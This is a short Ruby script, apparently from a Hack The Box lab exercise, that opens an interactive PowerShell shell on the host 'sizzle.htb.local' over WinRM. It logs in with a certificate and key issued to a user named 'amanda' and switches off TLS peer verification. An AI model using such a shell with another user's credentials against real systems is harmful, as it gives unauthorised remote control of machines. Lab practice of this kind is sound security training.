require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'https://sizzle.htb.local:5986/wsman',
  transport: :ssl,
  :client_cert => 'amanda.cer',
  :client_key => 'amanda.key',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
